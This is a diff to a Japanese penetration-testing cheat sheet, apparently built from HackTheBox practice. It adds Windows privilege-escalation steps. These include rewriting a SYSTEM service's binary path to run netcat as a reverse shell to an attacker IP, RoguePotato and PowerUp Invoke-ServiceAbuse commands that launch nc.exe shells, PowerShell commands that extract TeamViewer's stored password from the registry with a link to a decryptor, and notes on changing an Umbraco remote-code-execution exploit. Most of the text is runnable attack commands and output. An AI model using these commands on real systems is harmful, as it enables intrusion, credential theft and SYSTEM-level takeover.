@@ -819,11 +819,10 @@ magescan:
 https://github.com/steverobbins/magescan.git
 
 ### Umbraco
-#### 認証情報
+#### 認証情報ファイル
 ```
 /App_Data/Umbraco.sdf
 ```
-
 
 ## phpMyAdmin
 MySQLサーバをWebブラウザで管理するためのデータベース接続ツール。  
@@ -2568,7 +2567,7 @@ accesschk.exe /accepteula -uwcqv user daclsvc
 上記のコマンドにより、「user」アカウントには「SERVICE_CHANGE_CONFIG」を変更する権限があることを確認する。  
 次に下記のコマンドで「daclsvc」サービスを照会してSYSTEM特権(SERVICE_START_NAME)で実行されることを確認する。
 ```
-sc qc daclsvc
+sc.exe qc daclsvc
 ```
 サービス構成を変更し、「BINARY_PATH_NAME(binpath)」をreverse shellペイロードを配置したパスに書き換える。
 ```
@@ -2583,7 +2582,7 @@ net start daclsvc
 サービスに使用される実行可能ファイルへのパスが引用符で囲まれていない場合に現れる脆弱性。  
 「unquotedsvc」サービスを照会して、システム特権(SERVICE_START_NAME)で実行されていることと、「BINARY_PATH_NAME」が引用符で囲まれておらずスペースが含まれていることを確認する。
 ```
-C:\Windows\Temp > sc qc <Service Name>
+C:\Windows\Temp > sc.exe qc <Service Name>
 
 SERVICE_NAME: <Service Name>
         TYPE               : 10  WIN32_OWN_PROCESS
@@ -2673,6 +2672,54 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\<Service Name>\<Service(reverse sh
 最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
 ```
 net start <Service Name>
+```
+
+## Service Permissions - Modifiable Services
+PowerUp.ps1によってSYSTEM権限で実行されている書き換え可能なサービスが存在する場合に実行する。
+```
+ServiceName   : daclsvc
+Path          : "C:\Program Files\DACL Service\daclservice.exe"
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -ServiceName 'daclsvc'
+
+
+ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+Name          : UsoSvc
+Check         : Modifiable Services
+```
+```
+PS C:\windows\temp> sc.exe qc usosvc
+sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\Public\Documents\nc.exe 10.10.16.2 4444 -e cmd.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+```
+```
+# 手動による悪用
+sc.exe stop UsoSvc
+sc.exe config UsoSvc binpath= "C:\Users\Public\Documents\nc.exe 10.10.16.2 4444 -e cmd.exe"
+## 書き換えられていることを確認
+sc.exe qc UsoSvc
+sc.exe start UsoSvc
+
+or
+
+# PowerUpのInvoke-ServiceAbuseを利用した悪用
+Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command 'C:\Windows\temp\nc.exe -e cmd.exe 10.10.16.2 9000'
 ```
 
 
@@ -2862,9 +2909,12 @@ JuicyPotato.exe -l 9000 -p C:\Windows\Temp\shell.exe -t * -c {03ca98d6-ff5d-49b8
 - -c...CLSID(default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
 
 CLSIDは、./juicy-potato/CLSID/から対応するOSを選択してUserが NT AUTHORITY\SYSTEMになっているものを指定する。  
+https://github.com/ohpe/juicy-potato/tree/master/CLSID  
+
 もしくは、./juicy-potato/CLSID/GetCLSID.ps1を利用してCLSIDを取得する。  
 powershellが何かの理由により使用できない場合、JuicyPotato.exe(test_clsid.batの内容に合わせるためjuicypotato.exeに名前を変更)と./juicy-potato/CLSID/<対応するOS>/CLSID.list/、./juicy-potato/Test/test_clsid.batをターゲットマシンに配置してCLSIDを集める。  
 ターゲット端末でtest_clsid.batを5分間起動してから、出力されたresult.logを確認してCLSIDを取得する。  
+
 
 
 ## Token Impersonation - Rogue Potato
@@ -2873,11 +2923,18 @@ powershellが何かの理由により使用できない場合、JuicyPotato.exe(
 - SeAssignPrimaryTokenPrivilege
 
 ```
-RoguePotato.exe -r <Local IP> -e "C:\Windows\Temp\reverse.exe" -l <Local Port>
+sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
+nc -lvnp 9999
+```
+```
+RoguePotato.exe -r <Attacker IP> -e "<payload>" -l <Attacker Port>
+RoguePotato.exe -r 10.10.16.2 -e "c:\windows\temp\nc.exe 10.10.16.2 9999 -e cmd.exe" -l 9999
+RoguePotato.exe -r 10.10.16.2 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "c:\windows\temp\nc.exe 10.10.16.2 9999 -e cmd.exe" -l 9999
 ```
 - -r...リモートIPアドレス(攻撃者端末のIP)
 - -e...reverse shellペイロードのパス
 - -l...リスニングポート(攻撃者端末の待ち受けポート)
+- -c...CLSIDの指定({B91D5831-B1BD-4608-8198-D72E155020F7}はUsoSvcのもの)
 
 ## Token Impersonation - PrintSpoofer
 上記で得られたシェルでwhoami /privコマンドを使用すると下記のような結果を得られる。  
@@ -3197,6 +3254,34 @@ gem install evil-winrm
 evil-winrm -u <username> -p <password> -i <remote host ip>
 ```
 
+## Privilege Escalation(Software)
+### Docker
+### TeamViewer
+TeamViewerではパスワードがWindowsレジストリに保存されている(AES-128-CBC)  
+```
+# TeamViewerの情報を出力
+Get-ItemProperty -Path HKLM:SOFTWARE\WOW6432Node\TeamViewer\Version7
+
+# SecurityPasswordAESの値を出力
+Get-ItemPropertyValue -LiteralPath 'HKLM:SOFTWARE\WOW6432Node\TeamViewer\Version7' -Name SecurityPasswordAES
+255
+155
+28
+115
+214
+107
+206
+49
+....
+```
+teamviewer_password_decrypt.py:  
+このスクリプトによりdecrypt可能  
+https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0
+
+
+
+
+
 ## PrivEsc Tools(Windows)
 Windows Sysinternals:  
 https://docs.microsoft.com/en-us/sysinternals/  
@@ -3232,6 +3317,8 @@ https://github.com/itm4n/PrintSpoofer.git
 
 Windows-kernel-exploits:  
 https://github.com/SecWiki/windows-kernel-exploits.git
+
+
 
 # Experience with HackTheBox(動作確認済みexploit)
 ## Initial Shell(Linux)
@@ -3325,6 +3412,11 @@ https://github.com/worawit/MS17-010
 
 Achat 0.150 beta7 - Remote Buffer Overflow:  
 https://www.exploit-db.com/exploits/36025
+
+Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution:
+proc.StartInfo.FileNameをcmd.exeに変更してstring cmdに引数を入れる
+その際にstring cmd = "/c certutil..."のように書き換える
+https://www.exploit-db.com/exploits/46153
 ```
 
 ## Privilege Escalation(Windows)
